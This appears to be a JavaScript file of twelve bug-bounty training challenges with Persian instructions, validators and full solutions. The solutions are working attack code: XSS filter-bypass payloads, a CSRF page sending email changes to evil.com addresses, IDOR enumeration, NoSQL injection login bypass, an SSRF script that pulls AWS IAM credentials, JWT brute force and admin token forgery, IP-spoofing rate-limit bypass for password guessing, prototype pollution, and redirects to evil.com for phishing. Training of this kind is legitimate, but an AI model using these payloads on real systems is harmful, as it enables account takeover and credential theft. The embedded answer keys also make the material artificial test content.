const BB_CHALLENGES = [
    {
        id: "bb1",
        title: "XSS در Search Box",
        company: "HackerOne",
        difficulty: "easy",
        desc: "یه payload بنویس که از فیلتر ساده عبور کنه و alert اجرا کنه.",
        tags: ["XSS", "Filter Bypass"],
        instruction: `<p>سایت هدف تگ <code>&lt;script&gt;</code> رو فیلتر می‌کنه ولی تگ‌های دیگه رو نه. یه XSS payload بنویس که بدون script کار کنه.</p>
<pre><code>// فیلتر سایت:
function sanitize(input) {
    return input.replace(/&lt;script&gt;/gi, '').replace(/&lt;\/script&gt;/gi, '');
}

// payload تو باید از این فیلتر رد بشه و JS اجرا کنه</code></pre>`,
        starterCode: '// payload خودت رو بنویس:\nconst payload = "";',
        validate: function(code) {
            return code.includes('onerror') || code.includes('onload') || code.includes('onmouseover') || code.includes('onfocus') || code.includes('svg/onload');
        },
        solution: `// روش‌های bypass:
const payload1 = '<img src=x onerror=alert(document.domain)>';
const payload2 = '<svg/onload=alert(1)>';
const payload3 = '<body onload=alert(1)>';
const payload4 = '<input onfocus=alert(1) autofocus>';
const payload5 = '<details open ontoggle=alert(1)>';`
    },
    {
        id: "bb2",
        title: "XSS با Encoding Bypass",
        company: "Bugcrowd",
        difficulty: "medium",
        desc: "فیلتر alert و document رو bypass کن.",
        tags: ["XSS", "Encoding", "Obfuscation"],
        instruction: `<p>سایت کلمات <code>alert</code> و <code>document</code> رو فیلتر می‌کنه. JS اجرا کن بدون استفاده مستقیم از این کلمات.</p>
<pre><code>// فیلتر:
function sanitize(input) {
    return input.replace(/alert/gi, '').replace(/document/gi, '');
}
// باید alert اجرا بشه!</code></pre>`,
        starterCode: '// payload بدون کلمه alert:\nconst payload = "";',
        validate: function(code) {
            return (code.includes('eval') || code.includes('Function') || code.includes('\\x') || code.includes('fromCharCode') || code.includes('atob') || code.includes('[') || code.includes('constructor'));
        },
        solution: `// bypass ها:
const p1 = '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'; // base64
const p2 = '<img src=x onerror=[].constructor.constructor("al"+"ert(1)")()>';
const p3 = '<img src=x onerror=window["al"+"ert"](1)>';
const p4 = '<img src=x onerror=self["al"+"ert"](1)>';
const p5 = '<img src=x onerror=top[/al/.source+/ert/.source](1)>';`
    },
    {
        id: "bb3",
        title: "CSRF Token Bypass",
        company: "HackerOne",
        difficulty: "medium",
        desc: "صفحه‌ای بساز که CSRF حمله انجام بده وقتی token validate نمیشه.",
        tags: ["CSRF", "HTML"],
        instruction: `<p>سایت هدف CSRF token داره ولی وقتی token خالی باشه validate نمی‌کنه (باگ!). یه HTML صفحه بساز که email کاربر رو عوض کنه.</p>
<pre><code>// Endpoint آسیب‌پذیر:
// POST /api/account/email
// Body: { email: "new@email.com", csrf_token: "" }
// وقتی csrf_token خالیه، سرور چک نمی‌کنه!</code></pre>`,
        starterCode: '// HTML صفحه CSRF رو بنویس:\nconst html = ``;',
        validate: function(code) {
            return code.includes('form') && code.includes('action') && code.includes('submit') && (code.includes('email') || code.includes('POST'));
        },
        solution: `const html = \`
<html><body>
<form id="csrf" action="https://target.com/api/account/email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="csrf_token" value="">
</form>
<script>document.getElementById('csrf').submit();</script>
</body></html>\`;`
    },
    {
        id: "bb4",
        title: "IDOR: دسترسی به فایل دیگران",
        company: "Bugcrowd",
        difficulty: "easy",
        desc: "اسکریپتی بنویس که فایل‌های کاربران دیگه رو enumerate کنه.",
        tags: ["IDOR", "Automation"],
        instruction: `<p>Endpoint <code>/api/files/:id</code> فایل‌ها رو بر اساس ID عددی برمی‌گردونه. Authorization check نداره! اسکریپتی بنویس که IDهای 1 تا 50 رو تست کنه.</p>
<pre><code>// GET /api/files/1 → فایل خودت
// GET /api/files/2 → فایل یکی دیگه! (IDOR)
// اسکریپت باید ID هایی که 200 برمی‌گردونن رو لیست کنه</code></pre>`,
        starterCode: 'async function enumFiles(token) {\n    // کدت رو اینجا بنویس\n}',
        validate: function(code) {
            return code.includes('for') && code.includes('fetch') && code.includes('/api/files/') && (code.includes('200') || code.includes('.ok'));
        },
        solution: `async function enumFiles(token) {
    const found = [];
    for (let id = 1; id <= 50; id++) {
        const res = await fetch('/api/files/' + id, {
            headers: { 'Authorization': 'Bearer ' + token }
        });
        if (res.ok) {
            const data = await res.json();
            found.push({ id, data });
            console.log('[+] Accessible:', id);
        }
    }
    return found;
}`
    },
    {
        id: "bb5",
        title: "NoSQL Injection Login Bypass",
        company: "Synack",
        difficulty: "medium",
        desc: "با NoSQL injection بدون رمز لاگین کن.",
        tags: ["NoSQL Injection", "Auth Bypass"],
        instruction: `<p>سایت از MongoDB استفاده می‌کنه و ورودی رو مستقیم به query می‌فرسته. Payload بنویس که بدون دونستن رمز لاگین کنه.</p>
<pre><code>// Backend آسیب‌پذیر:
// const user = await User.findOne({
//     username: req.body.username,
//     password: req.body.password
// });

// اگه user پیدا بشه = لاگین موفق</code></pre>`,
        starterCode: '// fetch request با payload مخرب:\nconst payload = {};',
        validate: function(code) {
            return code.includes('$ne') || code.includes('$gt') || code.includes('$regex') || code.includes('$exists');
        },
        solution: `// روش 1: $ne (not equal)
const payload1 = {
    username: "admin",
    password: { "$ne": "" }  // password != "" → همیشه true
};

// روش 2: $gt
const payload2 = {
    username: "admin",
    password: { "$gt": "" }  // password > "" → همیشه true
};

// روش 3: $regex
const payload3 = {
    username: { "$regex": ".*" },
    password: { "$regex": ".*" }
};

// ارسال:
fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload1)
});`
    },
    {
        id: "bb6",
        title: "SSRF: خواندن AWS Metadata",
        company: "HackerOne",
        difficulty: "medium",
        desc: "از قابلیت URL preview سایت سوءاستفاده کن و metadata AWS رو بخون.",
        tags: ["SSRF", "Cloud"],
        instruction: `<p>سایت endpoint <code>/api/preview?url=</code> داره که محتوای URL رو fetch می‌کنه. ازش استفاده کن تا AWS metadata (credentials) رو بخونی.</p>
<pre><code>// Endpoint عادی:
// GET /api/preview?url=https://example.com → محتوای صفحه

// هدف: به AWS metadata دسترسی بگیر
// AWS metadata endpoint: http://169.254.169.254/latest/meta-data/</code></pre>`,
        starterCode: '// SSRF exploit رو بنویس:\nasync function exploitSSRF(baseUrl) {\n    // کدت رو اینجا بنویس\n}',
        validate: function(code) {
            return code.includes('169.254.169.254') && code.includes('fetch') && (code.includes('/api/preview') || code.includes('url='));
        },
        solution: `async function exploitSSRF(baseUrl) {
    // Step 1: خواندن لیست role ها
    const res1 = await fetch(baseUrl + '/api/preview?url=' +
        encodeURIComponent('http://169.254.169.254/latest/meta-data/iam/security-credentials/'));
    const role = await res1.text();
    console.log('[+] Role:', role);

    // Step 2: خواندن credentials
    const res2 = await fetch(baseUrl + '/api/preview?url=' +
        encodeURIComponent('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role.trim()));
    const creds = await res2.json();
    console.log('[+] AccessKeyId:', creds.AccessKeyId);
    console.log('[+] SecretAccessKey:', creds.SecretAccessKey);
    console.log('[+] Token:', creds.Token);
    return creds;
}`
    },
    {
        id: "bb7",
        title: "JWT Secret Brute Force",
        company: "Synack",
        difficulty: "hard",
        desc: "secret ضعیف JWT رو پیدا کن و توکن admin جعل کن.",
        tags: ["JWT", "Auth", "Crypto"],
        instruction: `<p>سایت از JWT با الگوریتم HS256 استفاده می‌کنه. secret ضعیفه. توکن رو decode کن، secret رو حدس بزن و توکن admin بساز.</p>
<pre><code>// توکن فعلی (user role):
// eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxx
// Payload: {"user":"guest","role":"user"}
// هدف: توکن با role:"admin" بساز

// لیست secret های رایج برای brute force:
// secret, password, 123456, admin, key</code></pre>`,
        starterCode: '// JWT forge script:\nasync function forgeJWT() {\n    // کدت رو اینجا بنویس\n}',
        validate: function(code) {
            return (code.includes('admin') && code.includes('sign') || code.includes('hmac') || code.includes('crypto') || code.includes('btoa') || code.includes('header') && code.includes('payload'));
        },
        solution: `// با استفاده از jsonwebtoken (Node.js):
const jwt = require('jsonwebtoken');

async function forgeJWT() {
    const token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxx";
    const secrets = ['secret', 'password', '123456', 'admin', 'key', 'jwt_secret'];

    // Brute force secret
    for (const secret of secrets) {
        try {
            jwt.verify(token, secret);
            console.log('[+] Secret found:', secret);

            // Forge admin token
            const adminToken = jwt.sign(
                { user: "guest", role: "admin" },
                secret
            );
            console.log('[+] Admin token:', adminToken);
            return adminToken;
        } catch(e) {}
    }
}

// بدون library (pure JS concept):
// 1. Base64 decode header و payload
// 2. payload رو تغییر بده: role → admin
// 3. با secret پیدا شده HMAC-SHA256 بزن
// 4. سه بخش رو با . وصل کن`
    },
    {
        id: "bb8",
        title: "Subdomain Takeover Check",
        company: "Bugcrowd",
        difficulty: "easy",
        desc: "اسکریپتی بنویس که subdomain های dangling رو پیدا کنه.",
        tags: ["Recon", "Subdomain"],
        instruction: `<p>وقتی subdomain به سرویسی (مثل S3, Heroku) اشاره می‌کنه که دیگه وجود نداره، قابل takeover ه. اسکریپتی بنویس که لیست subdomain ها رو چک کنه.</p>
<pre><code>// نشانه‌های subdomain takeover:
// - "NoSuchBucket" (AWS S3)
// - "There isn't a GitHub Pages site here" (GitHub)
// - "No such app" (Heroku)
// - NXDOMAIN یا CNAME به سرویس مرده</code></pre>`,
        starterCode: 'async function checkTakeover(subdomains) {\n    // کدت رو اینجا بنویس\n}',
        validate: function(code) {
            return code.includes('for') && code.includes('fetch') && (code.includes('NoSuchBucket') || code.includes('includes') || code.includes('text()'));
        },
        solution: `async function checkTakeover(subdomains) {
    const signatures = [
        'NoSuchBucket',
        "There isn't a GitHub Pages site here",
        'No such app',
        'is not a registered IngressRoute',
        'Domain is not configured',
        'no-such-app'
    ];

    const vulnerable = [];
    for (const sub of subdomains) {
        try {
            const res = await fetch('https://' + sub, {
                signal: AbortSignal.timeout(5000)
            });
            const body = await res.text();
            for (const sig of signatures) {
                if (body.includes(sig)) {
                    vulnerable.push({ sub, signature: sig });
                    console.log('[!] Takeover possible:', sub, sig);
                }
            }
        } catch(e) {
            // NXDOMAIN or timeout - might be dead
            console.log('[?] Dead/timeout:', sub);
        }
    }
    return vulnerable;
}`
    },
    {
        id: "bb9",
        title: "Rate Limit Bypass",
        company: "HackerOne",
        difficulty: "medium",
        desc: "rate limit لاگین رو bypass کن با header manipulation.",
        tags: ["Auth", "Rate Limit", "Bypass"],
        instruction: `<p>سایت بعد 5 تلاش ناموفق IP رو بلاک می‌کنه. با تغییر headerها rate limit رو دور بزن.</p>
<pre><code>// بعد 5 بار: "Too many requests"
// هدف: با هر request یه IP جعلی بفرست
// headerهای مرتبط:
// X-Forwarded-For, X-Real-IP, X-Originating-IP
// X-Client-IP, CF-Connecting-IP</code></pre>`,
        starterCode: 'async function bypassRateLimit(url, passwords) {\n    // کدت رو اینجا بنویس\n}',
        validate: function(code) {
            return code.includes('X-Forwarded-For') || code.includes('X-Real-IP') || code.includes('X-Client-IP') || code.includes('X-Originating-IP');
        },
        solution: `async function bypassRateLimit(url, passwords) {
    for (let i = 0; i < passwords.length; i++) {
        const fakeIP = \`\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}\`;

        const res = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Forwarded-For': fakeIP,
                'X-Real-IP': fakeIP,
                'X-Originating-IP': fakeIP,
                'X-Client-IP': fakeIP
            },
            body: JSON.stringify({
                username: 'admin',
                password: passwords[i]
            })
        });

        if (res.status === 200) {
            console.log('[+] Password found:', passwords[i]);
            return passwords[i];
        }
        console.log('[*] Trying:', passwords[i], '| Fake IP:', fakeIP);
    }
}`
    },
    {
        id: "bb10",
        title: "Prototype Pollution",
        company: "Synack",
        difficulty: "hard",
        desc: "با Prototype Pollution به admin دسترسی بگیر.",
        tags: ["Prototype Pollution", "JS"],
        instruction: `<p>سایت یه merge function داره که ورودی کاربر رو با config ادغام می‌کنه. با prototype pollution property <code>isAdmin</code> رو true کن.</p>
<pre><code>// Backend آسیب‌پذیر:
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// بعداً:
// if (user.isAdmin) { /* admin panel */ }</code></pre>`,
        starterCode: '// Payload برای prototype pollution:\nconst payload = {};',
        validate: function(code) {
            return code.includes('__proto__') || code.includes('constructor') && code.includes('prototype');
        },
        solution: `// Payload:
const payload = {
    "__proto__": {
        "isAdmin": true
    }
};

// یا از طریق constructor:
const payload2 = {
    "constructor": {
        "prototype": {
            "isAdmin": true
        }
    }
};

// ارسال:
fetch('/api/settings', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
});

// حالا هر object جدید isAdmin: true داره!
const test = {};
console.log(test.isAdmin); // true`
    },
    {
        id: "bb11",
        title: "Open Redirect to XSS",
        company: "Bugcrowd",
        difficulty: "easy",
        desc: "از Open Redirect برای اجرای JavaScript استفاده کن.",
        tags: ["Open Redirect", "XSS"],
        instruction: `<p>سایت endpoint <code>/redirect?url=</code> داره که بدون validation ریدایرکت می‌کنه. ازش برای XSS استفاده کن.</p>
<pre><code>// عادی: /redirect?url=https://google.com → ریدایرکت به گوگل
// هدف: XSS اجرا کن با javascript: protocol
// یا ریدایرکت به سایت خودت برای phishing</code></pre>`,
        starterCode: '// Open redirect payload:\nconst payload = "";',
        validate: function(code) {
            return code.includes('javascript:') || code.includes('data:') || code.includes('//evil') || code.includes('%2f');
        },
        solution: `// XSS via javascript protocol:
const p1 = '/redirect?url=javascript:alert(document.domain)';
const p2 = '/redirect?url=javascript:alert(document.cookie)';

// Bypass filters:
const p3 = '/redirect?url=jAvAsCrIpT:alert(1)';
const p4 = '/redirect?url=java%0ascript:alert(1)';
const p5 = '/redirect?url=//evil.com'; // protocol-relative
const p6 = '/redirect?url=https://evil.com/phishing';

// Data URI:
const p7 = '/redirect?url=data:text/html,<script>alert(1)</script>';`
    },
    {
        id: "bb12",
        title: "API Key Extraction از JS",
        company: "HackerOne",
        difficulty: "easy",
        desc: "اسکریپتی بنویس که API key و secret های لو رفته رو از فایل‌های JS پیدا کنه.",
        tags: ["Recon", "Secrets", "Regex"],
        instruction: `<p>فایل‌های JavaScript سایت ممکنه API key، token یا secret داشته باشن. اسکریپتی بنویس که اینا رو extract کنه.</p>
<pre><code>// نمونه‌هایی که باید پیدا بشن:
// AWS: AKIAIOSFODNN7EXAMPLE
// Google: AIzaSyC2x...
// JWT: eyJhbGci...
// Generic: api_key = "abc123"</code></pre>`,
        starterCode: 'function findSecrets(jsCode) {\n    // کدت رو اینجا بنویس\n}',
        validate: function(code) {
            return code.includes('regex') || code.includes('RegExp') || code.includes('/') && (code.includes('AKIA') || code.includes('AIza') || code.includes('eyJ') || code.includes('api'));
        },
        solution: `function findSecrets(jsCode) {
    const patterns = {
        'AWS Access Key': /AKIA[0-9A-Z]{16}/g,
        'AWS Secret': /[0-9a-zA-Z\\/+]{40}/g,
        'Google API Key': /AIza[0-9A-Za-z\\-_]{35}/g,
        'JWT Token': /eyJ[A-Za-z0-9-_]+\\.eyJ[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+/g,
        'Generic API Key': /['\"]?api[_-]?key['\"]?\\s*[:=]\\s*['\"][^'"]+['\"]/gi,
        'Generic Secret': /['\"]?secret['\"]?\\s*[:=]\\s*['\"][^'"]+['\"]/gi,
        'Private Key': /-----BEGIN (RSA |EC )?PRIVATE KEY-----/g,
        'Bearer Token': /Bearer\\s+[A-Za-z0-9\\-._~+\\/]+=*/g,
    };

    const found = [];
    for (const [name, regex] of Object.entries(patterns)) {
        const matches = jsCode.match(regex);
        if (matches) {
            found.push({ type: name, values: matches });
            console.log('[!]', name, ':', matches);
        }
    }
    return found;
}`
    }
];
